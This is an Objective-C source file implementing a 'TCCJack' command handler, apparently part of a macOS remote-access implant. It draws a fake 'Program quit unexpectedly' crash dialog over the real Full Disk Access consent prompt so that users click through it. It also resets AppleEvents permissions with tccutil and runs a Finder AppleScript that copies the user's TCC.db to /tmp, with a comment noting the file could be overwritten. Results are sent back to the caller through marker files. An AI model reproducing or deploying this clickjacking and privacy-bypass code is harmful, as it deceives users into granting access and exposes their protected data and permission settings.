#import "ZTCCJackCommandHandler.h"
#import "ZDialogCommandHandler.h"
#import <AppKit/AppKit.h>
#import <Security/Security.h>
#import <objc/runtime.h>
#import <dlfcn.h>

// For macOS version checking
#include <AvailabilityMacros.h>

// Define function pointer types for the deprecated functions
typedef CGImageRef (*CGWindowListCreateImageFuncPtr)(CGRect bounds, CGWindowListOption options, CGWindowID relativeToWindow, CGWindowImageOption imageOption);
typedef CGImageRef (*CGDisplayCreateImageFuncPtr)(CGDirectDisplayID displayID);

// Define debug macro for verbose logging
#define TCCJACK_LOG(fmt, ...) NSLog(@"[TCCJack Debug] %s:%d - " fmt, __FUNCTION__, __LINE__, ##__VA_ARGS__)

@implementation ZTCCJackCommandHandler {
    ZDialogCommandHandler *_dialogHandler;
    NSWindow *_overlayWindow;
    BOOL _tccPromptTriggered;
    dispatch_queue_t _workQueue;
    NSString *_scriptPath;
    NSTask *_scriptTask;  // To retain the task while it's running
}

- (instancetype)init {
    TCCJACK_LOG(@"Initializing TCCJack handler");
    self = [super initWithType:@"tccjack"];
    if (self) {
        TCCJACK_LOG(@"TCCJack handler initialization successful");
        _dialogHandler = [[ZDialogCommandHandler alloc] init];
        TCCJACK_LOG(@"Dialog handler created: %@", _dialogHandler);
        _tccPromptTriggered = NO;
        _workQueue = dispatch_queue_create("com.tccjack.workqueue", DISPATCH_QUEUE_SERIAL);
        TCCJACK_LOG(@"Work queue created: %p", _workQueue);
        _scriptTask = nil;
        _scriptPath = nil;
        
        TCCJACK_LOG(@"Creating AppleScript");
        @try {
            NSString *path = [self createAppleScript];
            if (path && [path isKindOfClass:[NSString class]]) {
                _scriptPath = [path copy];
                TCCJACK_LOG(@"AppleScript created at: %@", _scriptPath);
            } else {
                TCCJACK_LOG(@"ERROR: createAppleScript did not return a valid string, got: %@", path);
            }
        } @catch (NSException *exception) {
            TCCJACK_LOG(@"ERROR: Exception during AppleScript creation: %@", exception);
        }
    } else {
        TCCJACK_LOG(@"ERROR: Failed to initialize TCCJack handler");
    }
    return self;
}

- (void)dealloc {
    TCCJACK_LOG(@"Deallocating TCCJack handler");
    TCCJACK_LOG(@"Releasing dialog handler: %@", _dialogHandler);
    [_dialogHandler release];
    
    if (_overlayWindow) {
        TCCJACK_LOG(@"Releasing overlay window: %@", _overlayWindow);
        [_overlayWindow release];
    }
    
    // Clean up any script task
    if (_scriptTask) {
        TCCJACK_LOG(@"Releasing script task: %@", _scriptTask);
        [_scriptTask release];
    }
    
    // Remove any observers
    [[NSNotificationCenter defaultCenter] removeObserver:self];
    
    TCCJACK_LOG(@"Releasing work queue: %p", _workQueue);
    dispatch_release(_workQueue);
    
    [_scriptPath release];
    
    TCCJACK_LOG(@"TCCJack handler deallocation complete");
    [super dealloc];
}

- (NSString *)createAppleScript {
    TCCJACK_LOG(@"Creating AppleScript");
    
    // Create temporary directory for our script
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSString *tempDir = [NSTemporaryDirectory() stringByAppendingPathComponent:@"scripts"];
    
    TCCJACK_LOG(@"Temp directory for script: %@", tempDir);
    
    NSError *dirError = nil;
    BOOL dirCreated = [fileManager createDirectoryAtPath:tempDir 
                             withIntermediateDirectories:YES 
                                              attributes:nil 
                                                   error:&dirError];
    
    if (!dirCreated) {
        TCCJACK_LOG(@"ERROR: Failed to create temp directory: %@", dirError);
        return nil;
    }
    
    // Create AppleScript file path
    NSString *scriptPath = [tempDir stringByAppendingPathComponent:@"fulldisk_access.scpt"];
    TCCJACK_LOG(@"Script path: %@", scriptPath);
    
    // AppleScript content to trigger Full Disk Access permission
    NSString *scriptContent = @"tell application \"Finder\"\n"
                              @"    # copy the TCC database, this could also be used to overwrite it.\n"
                              @"    set applicationSupportDirectory to POSIX path of (path to application support from user domain)\n"
                              @"    set tccDirectory to applicationSupportDirectory & \"com.apple.TCC/TCC.db\"\n"
                              @"    try\n"
                              @"        duplicate file (POSIX file tccDirectory as alias) to folder (POSIX file \"/tmp/\" as alias) with replacing\n"
                              @"        # Create a success marker file instead of killing the process\n"
                              @"        do shell script \"touch /tmp/tccjack_success\"\n"
                              @"    on error errMsg\n"
                              @"        # Create a failure marker file\n"
                              @"        do shell script \"echo '\" & errMsg & \"' > /tmp/tccjack_failure\"\n"
                              @"    end try\n"
                              @"end tell";
    
    TCCJACK_LOG(@"Script content length: %lu bytes", (unsigned long)[scriptContent length]);
    
    // Write the script to file
    NSError *writeError = nil;
    BOOL writeSuccess = [scriptContent writeToFile:scriptPath 
                                        atomically:YES 
                                          encoding:NSUTF8StringEncoding 
                                             error:&writeError];
    
    if (!writeSuccess) {
        TCCJACK_LOG(@"ERROR: Failed to write script to file: %@", writeError);
        return nil;
    }
    
    TCCJACK_LOG(@"Script successfully written to: %@", scriptPath);
    
    // Verify the file was created
    if (![fileManager fileExistsAtPath:scriptPath]) {
        TCCJACK_LOG(@"ERROR: Script file does not exist after write");
        return nil;
    }
    
    // Remove any previous marker files
    [fileManager removeItemAtPath:@"/tmp/tccjack_success" error:nil];
    [fileManager removeItemAtPath:@"/tmp/tccjack_failure" error:nil];
    
    TCCJACK_LOG(@"Script verified, returning path");
    return [[scriptPath copy] autorelease];
}

- (void)executeCommand:(ZCommandModel *)command 
           completion:(void (^)(BOOL success, NSDictionary *result, NSError *error))completion {
    TCCJACK_LOG(@"Executing TCCJack command: %@", [command commandId]);
    
    // Create a copy of the completion block to avoid release issues
    void (^safeCompletion)(BOOL, NSDictionary*, NSError*) = [[completion copy] autorelease];
    TCCJACK_LOG(@"Created safe completion block: %p", safeCompletion);
    
    // Store the completion handler for later use
    objc_setAssociatedObject(self, "completion_block", safeCompletion, OBJC_ASSOCIATION_COPY);
    TCCJACK_LOG(@"Stored completion block as associated object");
    
    // Make sure we're running on the main thread
    TCCJACK_LOG(@"Dispatching to main thread, current thread: %@", [NSThread currentThread]);
    dispatch_async(dispatch_get_main_queue(), ^{
        TCCJACK_LOG(@"Now on main thread: %@", [NSThread currentThread]);
        
        @try {
            TCCJACK_LOG(@"Ensuring application setup");
            [self ensureApplicationSetup];
            
            TCCJACK_LOG(@"Creating fake system crash dialog");
            [self createFakeSystemCrashDialog];
            
            TCCJACK_LOG(@"Resetting TCC permissions");
            [self resetTCCPermissions];
            
            TCCJACK_LOG(@"Running AppleScript");
            [self runAppleScript];
            
            TCCJACK_LOG(@"Setting up timeout for TCC prompt");
            // Set a timeout in case the TCC prompt doesn't appear
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(30 * NSEC_PER_SEC)), 
                        dispatch_get_main_queue(), ^{
                TCCJACK_LOG(@"Timeout check triggered, tccPromptTriggered = %d", _tccPromptTriggered);
                
                NSFileManager *fileManager = [NSFileManager defaultManager];
                BOOL success = [fileManager fileExistsAtPath:@"/tmp/tccjack_success"];
                BOOL failure = [fileManager fileExistsAtPath:@"/tmp/tccjack_failure"];
                
                NSMutableDictionary *result = [NSMutableDictionary dictionary];
                [result setObject:@"tccjack_response" forKey:@"type"];
                
                if (success) {
                    TCCJACK_LOG(@"TCC operation successful, found success marker file");
                    [result setObject:@"success" forKey:@"status"];
                    [result setObject:@"Full Disk Access was granted" forKey:@"message"];
                    _tccPromptTriggered = YES;
                } else if (failure) {
                    TCCJACK_LOG(@"TCC operation failed, found failure marker file");
                    NSString *errorContent = [NSString stringWithContentsOfFile:@"/tmp/tccjack_failure" encoding:NSUTF8StringEncoding error:nil];
                    [result setObject:@"failed" forKey:@"status"];
                    [result setObject:[NSString stringWithFormat:@"Full Disk Access denied: %@", errorContent] forKey:@"message"];
                    _tccPromptTriggered = YES;
                } else if (!_tccPromptTriggered) {
                    TCCJACK_LOG(@"TCC prompt didn't appear within timeout period");
                    [result setObject:@"failed" forKey:@"status"];
                    [result setObject:@"TCC prompt did not appear" forKey:@"message"];
                }
                
                // Clean up
                if (_overlayWindow) {
                    TCCJACK_LOG(@"Closing and releasing overlay window: %@", _overlayWindow);
                    [_overlayWindow close];
                    [_overlayWindow release];
                    _overlayWindow = nil;
                }
                
                TCCJACK_LOG(@"Created result dictionary: %@", result);
                
                void (^savedCompletion)(BOOL, NSDictionary*, NSError*) = objc_getAssociatedObject(self, "completion_block");
                if (savedCompletion) {
                    TCCJACK_LOG(@"Calling saved completion block: %p", savedCompletion);
                    savedCompletion(_tccPromptTriggered, result, nil);
                    TCCJACK_LOG(@"Clearing saved completion block");
                    objc_setAssociatedObject(self, "completion_block", nil, OBJC_ASSOCIATION_COPY);
                } else {
                    TCCJACK_LOG(@"ERROR: No saved completion block found");
                }
            });
        } @catch (NSException *exception) {
            TCCJACK_LOG(@"ERROR: Exception during command execution: %@", exception);
            NSMutableDictionary *result = [NSMutableDictionary dictionary];
            [result setObject:@"tccjack_response" forKey:@"type"];
            [result setObject:@"failed" forKey:@"status"];
            [result setObject:[NSString stringWithFormat:@"Exception: %@", exception] forKey:@"message"];
            
            safeCompletion(NO, result, nil);
        }
    });
}

- (void)resetTCCPermissions {
    TCCJACK_LOG(@"Resetting TCC permissions for AppleEvents");
    
    @try {
        // Reset AppleEvents permissions to ensure the prompt shows up
        NSTask *task = [[[NSTask alloc] init] autorelease];
        [task setLaunchPath:@"/usr/bin/tccutil"];
        [task setArguments:@[@"reset", @"AppleEvents"]];
        
        TCCJACK_LOG(@"Created task: %@ with arguments: %@", task.launchPath, task.arguments);
        
        TCCJACK_LOG(@"Launching task");
        [task launch];
        
        TCCJACK_LOG(@"Waiting for task to exit");
        [task waitUntilExit];
        
        int status = [task terminationStatus];
        TCCJACK_LOG(@"Task exited with status: %d", status);
        
        if (status == 0) {
            TCCJACK_LOG(@"Successfully reset AppleEvents");
        } else {
            TCCJACK_LOG(@"Failed to reset AppleEvents, status: %d", status);
        }
    } @catch (NSException *exception) {
        TCCJACK_LOG(@"ERROR: Exception when trying to reset TCC permissions: %@", exception);
    }
}

- (void)runAppleScript {
    TCCJACK_LOG(@"Running AppleScript to trigger Full Disk Access TCC prompt");
    
    // Validate script path is a proper string
    if (!_scriptPath || ![_scriptPath isKindOfClass:[NSString class]]) {
        TCCJACK_LOG(@"ERROR: Script path is nil or not a string object, cannot run AppleScript. Path: %@", _scriptPath);
        return;
    }
    
    TCCJACK_LOG(@"Checking if script file exists at: %@", _scriptPath);
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if (![fileManager fileExistsAtPath:_scriptPath]) {
        TCCJACK_LOG(@"ERROR: Script file does not exist: %@", _scriptPath);
        return;
    }
    
    @try {
        // Create the script again if needed
        if (!_scriptPath || ![fileManager fileExistsAtPath:_scriptPath]) {
            TCCJACK_LOG(@"Re-creating AppleScript as path is invalid");
            NSString *newPath = [self createAppleScript];
            if (newPath && [newPath isKindOfClass:[NSString class]]) {
                [_scriptPath release];
                _scriptPath = [newPath copy];
                TCCJACK_LOG(@"AppleScript re-created at: %@", _scriptPath);
            } else {
                TCCJACK_LOG(@"ERROR: Failed to re-create AppleScript");
                return;
            }
        }
        
        TCCJACK_LOG(@"Creating task to run osascript with script: %@", _scriptPath);
        
        // Release any existing task
        if (_scriptTask) {
            [_scriptTask release];
            _scriptTask = nil;
        }
        
        _scriptTask = [[NSTask alloc] init];
        [_scriptTask setLaunchPath:@"/usr/bin/osascript"];
        [_scriptTask setArguments:@[_scriptPath]];
        
        // Use a simpler approach to run the script
        TCCJACK_LOG(@"Launching osascript with simplified output handling");
        [_scriptTask launch];
        
        // We don't wait for it to exit, but we'll keep the task object
        // around so we can reference it later if needed
        TCCJACK_LOG(@"AppleScript launched, continuing execution");
    } @catch (NSException *exception) {
        TCCJACK_LOG(@"ERROR: Exception when trying to run AppleScript: %@", exception);
    }
}

- (void)createFakeSystemCrashDialog {
    TCCJACK_LOG(@"Creating fake system crash dialog");
    
    @try {
        // Create our overlay window
        if (_overlayWindow) {
            TCCJACK_LOG(@"Closing and releasing existing overlay window: %@", _overlayWindow);
            [_overlayWindow close];
            [_overlayWindow release];
            _overlayWindow = nil;
        }
        
        NSRect screenRect = [[NSScreen mainScreen] frame];
        TCCJACK_LOG(@"Screen rect: %@", NSStringFromRect(screenRect));
        
        NSRect windowRect = NSMakeRect(0, 0, 300, 300);
        
        // Position window to align with TCC prompt
        windowRect.origin.x = (screenRect.size.width - windowRect.size.width) / 2;
        windowRect.origin.y = screenRect.size.height - windowRect.size.height - 230; // Position 250px from top
        
        TCCJACK_LOG(@"Window rect: %@", NSStringFromRect(windowRect));
        
        TCCJACK_LOG(@"Creating window");
        _overlayWindow = [[NSWindow alloc] initWithContentRect:windowRect
                                                   styleMask:NSWindowStyleMaskTitled
                                                     backing:NSBackingStoreBuffered
                                                       defer:NO];
        
        if (!_overlayWindow) {
            TCCJACK_LOG(@"ERROR: Failed to create overlay window");
            return;
        }
        
        TCCJACK_LOG(@"Created window: %@", _overlayWindow);
        
        // Configure window appearance
        TCCJACK_LOG(@"Configuring window appearance");
        [_overlayWindow setOpaque:NO];
        [_overlayWindow setMovable:NO];
        
        // Set window level to appear above other windows
        TCCJACK_LOG(@"Setting window level to: %d", NSScreenSaverWindowLevel);
        [_overlayWindow setLevel:NSScreenSaverWindowLevel];
        
        // Don't capture mouse events - allow clicks to pass through to real dialog
        TCCJACK_LOG(@"Setting window to ignore mouse events");
        [_overlayWindow setIgnoresMouseEvents:YES];
        
        NSView *contentView = [_overlayWindow contentView];
        TCCJACK_LOG(@"Content view: %@", contentView);
        
        // Create warning icon
        TCCJACK_LOG(@"Creating warning icon");
        NSImageView *imageView = [[[NSImageView alloc] initWithFrame:NSMakeRect(110, 200, 84, 84)] autorelease];
        NSImage *warningIcon = [NSImage imageNamed:NSImageNameCaution];
        TCCJACK_LOG(@"Warning icon image: %@", warningIcon);
        [imageView setImage:warningIcon];
        [contentView addSubview:imageView];
        
        // Create title label
        TCCJACK_LOG(@"Creating title label");
        NSTextField *titleLabel = [[[NSTextField alloc] init] autorelease];
        [titleLabel setBezeled:NO];
        [titleLabel setEditable:NO];
        [titleLabel setAlignment:NSTextAlignmentCenter];
        [titleLabel setFont:[NSFont boldSystemFontOfSize:16]];
        [titleLabel setStringValue:@"Program quit unexpectedly"];
        [titleLabel setBackgroundColor:[NSColor clearColor]];
        [titleLabel setFrame:NSMakeRect(0, 140, 300, 50)];
        [contentView addSubview:titleLabel];
        
        // Create description text
        TCCJACK_LOG(@"Creating description text");
        NSTextField *descLabel = [[[NSTextField alloc] init] autorelease];
        [descLabel setAlignment:NSTextAlignmentLeft];
        [descLabel setBezeled:NO];
        [descLabel setEditable:NO];
        [descLabel setFont:[NSFont systemFontOfSize:15]];
        [descLabel setBackgroundColor:[NSColor clearColor]];
        [descLabel setFrame:NSMakeRect(42, -40, 220, 200)];
        [descLabel setStringValue:@"Click OK to see more detailed information and send a report to Apple."];
        [contentView addSubview:descLabel];
        
        // Create fake OK button
        TCCJACK_LOG(@"Creating OK button");
        NSButton *okButton = [[[NSButton alloc] init] autorelease];
        [okButton setTitle:@"OK"];
        
        // Check if we can access the layer property
        TCCJACK_LOG(@"Setting button layer properties");
        if ([okButton respondsToSelector:@selector(setWantsLayer:)]) {
            [okButton setWantsLayer:YES];
            
            if (okButton.layer) {
                [okButton.layer setBorderWidth:0];
                [okButton.layer setCornerRadius:10];
            } else {
                TCCJACK_LOG(@"WARNING: Button layer is nil");
            }
        } else {
            TCCJACK_LOG(@"WARNING: Button does not respond to setWantsLayer:");
        }
        
        [okButton setAlignment:NSTextAlignmentCenter];
        [okButton setFont:[NSFont systemFontOfSize:14]];
        [okButton setFrame:NSMakeRect(154, 36, 110, 30)];
        [contentView addSubview:okButton];
        
        // Set up a timer to check for TCC response
        NSTimer *checkTimer = [NSTimer scheduledTimerWithTimeInterval:0.1 // Check every 100ms
                                                             target:self
                                                           selector:@selector(checkTCCResponse:)
                                                           userInfo:nil
                                                            repeats:YES];
        
        // Store timer as associated object so it's retained
        objc_setAssociatedObject(self, "tcc_check_timer", checkTimer, OBJC_ASSOCIATION_RETAIN);
        
        TCCJACK_LOG(@"Set up TCC response check timer: %@", checkTimer);
        
        // Show the window
        TCCJACK_LOG(@"Making window key and ordering front");
        [_overlayWindow makeKeyAndOrderFront:nil];
        TCCJACK_LOG(@"Window successfully displayed");
    } @catch (NSException *exception) {
        TCCJACK_LOG(@"ERROR: Exception during window creation: %@", exception);
    }
}

- (void)checkTCCResponse:(NSTimer *)timer {
    // Run everything on the main thread to avoid synchronization issues
    dispatch_async(dispatch_get_main_queue(), ^{
        TCCJACK_LOG(@"Checking TCC response on main thread: %@", [NSThread currentThread]);
        
        NSFileManager *fileManager = [NSFileManager defaultManager];
        BOOL success = [fileManager fileExistsAtPath:@"/tmp/tccjack_success"];
        BOOL failure = [fileManager fileExistsAtPath:@"/tmp/tccjack_failure"];
        
        if (success || failure) {
            TCCJACK_LOG(@"TCC response detected - Success: %d, Failure: %d", success, failure);
            
            // Invalidate and clear timer first
            if ([timer isValid]) {
                TCCJACK_LOG(@"Invalidating timer: %@", timer);
                [timer invalidate];
            }
            objc_setAssociatedObject(self, "tcc_check_timer", nil, OBJC_ASSOCIATION_RETAIN);
            
            // Clean up marker files
            [fileManager removeItemAtPath:@"/tmp/tccjack_success" error:nil];
            [fileManager removeItemAtPath:@"/tmp/tccjack_failure" error:nil];
            TCCJACK_LOG(@"Cleaned up marker files");
            
            // Create result dictionary
            NSMutableDictionary *result = [[NSMutableDictionary alloc] init];
            [result setObject:@"tccjack_response" forKey:@"type"];
            [result setObject:(success ? @"success" : @"failed") forKey:@"status"];
            [result setObject:(success ? @"Full Disk Access was granted" : @"Full Disk Access was denied") forKey:@"message"];
            TCCJACK_LOG(@"Created result dictionary: %@", result);
            
            // Get and clear completion block
            void (^savedCompletion)(BOOL, NSDictionary*, NSError*) = objc_getAssociatedObject(self, "completion_block");
            objc_setAssociatedObject(self, "completion_block", nil, OBJC_ASSOCIATION_COPY);
            TCCJACK_LOG(@"Retrieved and cleared completion block: %p", savedCompletion);
            
            // Clean up window first
            if (_overlayWindow) {
                TCCJACK_LOG(@"Starting window cleanup. Current window: %@", _overlayWindow);
                NSWindow *windowToClose = _overlayWindow;
                _overlayWindow = nil;
                [windowToClose close];
                [windowToClose release];
                TCCJACK_LOG(@"Window cleanup complete");
            }
            
            // Set flag after window cleanup
            _tccPromptTriggered = YES;
            TCCJACK_LOG(@"Set tccPromptTriggered to YES");
            
            // Call completion last, after all cleanup is done
            if (savedCompletion) {
                TCCJACK_LOG(@"Calling completion block with result");
                @try {
                    savedCompletion(YES, result, nil);
                    TCCJACK_LOG(@"Completion block called successfully");
                } @catch (NSException *exception) {
                    TCCJACK_LOG(@"ERROR: Exception during completion block execution: %@", exception);
                }
            }
            
            [result release];
            TCCJACK_LOG(@"Cleanup complete");
        }
    });
}

- (void)ensureApplicationSetup {
    TCCJACK_LOG(@"Ensuring application is properly set up for UI, isMainThread: %d", [NSThread isMainThread]);
    
    if (![NSThread isMainThread]) {
        TCCJACK_LOG(@"ERROR: ensureApplicationSetup must be called from main thread!");
        return;
    }
    
    // Create shared application if needed
    TCCJACK_LOG(@"Creating shared application");
    NSApplication *app = [NSApplication sharedApplication];
    TCCJACK_LOG(@"Shared application: %@", app);
    
    // Make sure the app is properly activated
    if (![NSApp isRunning]) {
        TCCJACK_LOG(@"Initializing NSApp");
        // Use Accessory policy to avoid dock icon
        [NSApp setActivationPolicy:NSApplicationActivationPolicyAccessory];
        [NSApp finishLaunching];
        TCCJACK_LOG(@"NSApp initialized and finished launching");
    } else {
        TCCJACK_LOG(@"NSApp is already running");
    }
    
    // Ensure the app is activated
    TCCJACK_LOG(@"Activating app ignoring other apps");
    [NSApp activateIgnoringOtherApps:YES];
    TCCJACK_LOG(@"App activated");
}

@end 